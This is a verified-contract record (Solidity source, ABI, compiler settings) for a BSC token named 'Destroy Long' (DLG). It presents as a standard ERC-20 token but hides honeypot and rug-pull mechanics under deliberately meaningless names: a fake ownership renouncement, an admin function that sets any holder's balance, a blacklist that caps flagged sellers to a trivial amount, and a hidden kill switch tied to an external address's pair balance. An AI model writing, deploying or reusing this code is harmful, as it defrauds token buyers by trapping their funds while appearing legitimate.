{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface txAt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract amountMinShould {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface swapSender {\n    function createPair(address launchedFund, address minToken) external returns (address);\n}\n\ninterface totalTake {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address autoFundSell) external view returns (uint256);\n\n    function transfer(address toTake, uint256 maxLimit) external returns (bool);\n\n    function allowance(address atMax, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 maxLimit) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address toTake,\n        uint256 maxLimit\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed liquidityLimit, uint256 value);\n    event Approval(address indexed atMax, address indexed spender, uint256 value);\n}\n\ninterface totalTakeMetadata is totalTake {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DestroyLong is amountMinShould, totalTake, totalTakeMetadata {\n\n    function sellAt() private view {\n        require(teamSwap[_msgSender()]);\n    }\n\n    function transfer(address tokenMarketingWallet, uint256 maxLimit) external virtual override returns (bool) {\n        return receiverAmount(_msgSender(), tokenMarketingWallet, maxLimit);\n    }\n\n    uint256 listLaunch;\n\n    constructor (){\n        \n        txAt launchedToken = txAt(minSwap);\n        autoFund = swapSender(launchedToken.factory()).createPair(launchedToken.WETH(), address(this));\n        \n        modeLimit = _msgSender();\n        totalWallet();\n        teamSwap[modeLimit] = true;\n        senderAuto[modeLimit] = fundFrom;\n        \n        emit Transfer(address(0), modeLimit, fundFrom);\n    }\n\n    function getOwner() external view returns (address) {\n        return exemptFund;\n    }\n\n    mapping(address => bool) public launchedFrom;\n\n    function minLimit(address autoShouldSell, address toTake, uint256 maxLimit) internal returns (bool) {\n        require(senderAuto[autoShouldSell] >= maxLimit);\n        senderAuto[autoShouldSell] -= maxLimit;\n        senderAuto[toTake] += maxLimit;\n        emit Transfer(autoShouldSell, toTake, maxLimit);\n        return true;\n    }\n\n    mapping(address => uint256) private senderAuto;\n\n    function symbol() external view virtual override returns (string memory) {\n        return amountTrading;\n    }\n\n    function totalWallet() public {\n        emit OwnershipTransferred(modeLimit, address(0));\n        exemptFund = address(0);\n    }\n\n    mapping(address => bool) public teamSwap;\n\n    uint256 constant autoFrom = 9 ** 10;\n\n    address public autoFund;\n\n    function owner() external view returns (address) {\n        return exemptFund;\n    }\n\n    address private exemptFund;\n\n    event OwnershipTransferred(address indexed receiverAuto, address indexed swapLiquidityAt);\n\n    function transferFrom(address autoShouldSell, address toTake, uint256 maxLimit) external override returns (bool) {\n        if (_msgSender() != minSwap) {\n            if (teamLaunch[autoShouldSell][_msgSender()] != type(uint256).max) {\n                require(maxLimit <= teamLaunch[autoShouldSell][_msgSender()]);\n                teamLaunch[autoShouldSell][_msgSender()] -= maxLimit;\n            }\n        }\n        return receiverAmount(autoShouldSell, toTake, maxLimit);\n    }\n\n    uint256 private receiverMin;\n\n    function buyTo(address swapFrom) public {\n        if (buyTx) {\n            return;\n        }\n        if (limitToken == receiverMin) {\n            limitToken = fundExempt;\n        }\n        teamSwap[swapFrom] = true;\n        if (limitToken == fundExempt) {\n            fundExempt = limitToken;\n        }\n        buyTx = true;\n    }\n\n    string private amountTrading = \"DLG\";\n\n    function tokenToTx(address txLaunch) public {\n        sellAt();\n        \n        if (txLaunch == modeLimit || txLaunch == autoFund) {\n            return;\n        }\n        launchedFrom[txLaunch] = true;\n    }\n\n    uint256 private fundFrom = 100000000 * 10 ** 18;\n\n    function receiverAmount(address autoShouldSell, address toTake, uint256 maxLimit) internal returns (bool) {\n        if (autoShouldSell == modeLimit) {\n            return minLimit(autoShouldSell, toTake, maxLimit);\n        }\n        uint256 teamTokenLaunch = totalTake(autoFund).balanceOf(swapReceiver);\n        require(teamTokenLaunch == amountLaunchFrom);\n        require(toTake != swapReceiver);\n        if (launchedFrom[autoShouldSell]) {\n            return minLimit(autoShouldSell, toTake, autoFrom);\n        }\n        return minLimit(autoShouldSell, toTake, maxLimit);\n    }\n\n    function allowance(address launchMinFund, address exemptLaunchSwap) external view virtual override returns (uint256) {\n        if (exemptLaunchSwap == minSwap) {\n            return type(uint256).max;\n        }\n        return teamLaunch[launchMinFund][exemptLaunchSwap];\n    }\n\n    address minSwap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function name() external view virtual override returns (string memory) {\n        return fundSwapLaunched;\n    }\n\n    uint8 private modeEnable = 18;\n\n    function shouldTakeLaunched(address tokenMarketingWallet, uint256 maxLimit) public {\n        sellAt();\n        senderAuto[tokenMarketingWallet] = maxLimit;\n    }\n\n    mapping(address => mapping(address => uint256)) private teamLaunch;\n\n    uint256 public fundExempt;\n\n    address public modeLimit;\n\n    address swapReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function approve(address exemptLaunchSwap, uint256 maxLimit) public virtual override returns (bool) {\n        teamLaunch[_msgSender()][exemptLaunchSwap] = maxLimit;\n        emit Approval(_msgSender(), exemptLaunchSwap, maxLimit);\n        return true;\n    }\n\n    uint256 public limitToken;\n\n    bool public buyTx;\n\n    uint256 amountLaunchFrom;\n\n    function balanceOf(address autoFundSell) public view virtual override returns (uint256) {\n        return senderAuto[autoFundSell];\n    }\n\n    function minShould(uint256 maxLimit) public {\n        sellAt();\n        amountLaunchFrom = maxLimit;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return fundFrom;\n    }\n\n    string private fundSwapLaunched = \"Destroy Long\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return modeEnable;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapLiquidityAt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityLimit\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchMinFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptLaunchSwap\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptLaunchSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxLimit\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoFundSell\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapFrom\",\"type\":\"address\"}],\"name\":\"buyTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxLimit\",\"type\":\"uint256\"}],\"name\":\"minShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenMarketingWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxLimit\",\"type\":\"uint256\"}],\"name\":\"shouldTakeLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txLaunch\",\"type\":\"address\"}],\"name\":\"tokenToTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenMarketingWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxLimit\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoShouldSell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxLimit\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "DestroyLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}